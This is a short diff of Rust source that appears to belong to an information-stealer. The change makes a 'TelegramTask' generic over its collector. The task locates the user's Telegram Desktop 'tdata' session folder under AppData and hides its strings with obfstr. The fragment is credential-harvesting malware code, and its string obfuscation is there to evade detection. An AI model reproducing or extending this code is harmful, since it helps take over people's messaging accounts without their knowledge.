@@ -1,6 +1,5 @@
 use alloc::borrow::ToOwned;
 use alloc::vec;
-use collector::atomic::AtomicCollector;
 use collector::{Collector, Software};
 use obfstr::obfstr as s;
 use tasks::Task;
@@ -8,8 +7,8 @@ use utils::path::Path;
 
 pub(super) struct TelegramTask;
 
-impl Task for TelegramTask {
-    unsafe fn run(&self, parent: &Path, collector: &AtomicCollector) {
+impl<C: Collector> Task<C> for TelegramTask {
+    unsafe fn run(&self, parent: &Path, collector: &C) {
         let appdata = &Path::appdata();
         let paths = [
             (s!("Telegram Desktop").to_owned(), appdata / s!("Telegram Desktop") / s!("tdata")),
